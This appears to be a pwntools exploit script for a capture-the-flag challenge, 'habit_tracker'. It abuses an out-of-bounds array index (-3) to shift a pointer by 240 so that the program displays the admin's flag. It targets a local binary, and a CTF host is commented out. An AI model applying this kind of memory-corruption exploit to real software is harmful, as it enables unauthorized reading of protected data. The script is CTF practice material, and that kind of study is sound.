import pwn

def add_habit(name: bytes):
  io.sendline(b"2")
  io.sendline(name)

def update_habit(idx: int, amount: int):
  io.sendline(b"3")
  io.sendline(str(idx).encode())
  io.sendline(str(amount).encode())

def view_habits():
  io.sendline(b"1")

# io = pwn.remote("challenges.sshuzl.de", 12378)
io = pwn.process("../bin/habit_tracker")

### Exploit

add_habit(b"dummy")
# abuse OOB access and increment by 240,
# which makes it point at flag in admin habits.
update_habit(-3, 240)
view_habits()

io.interactive()
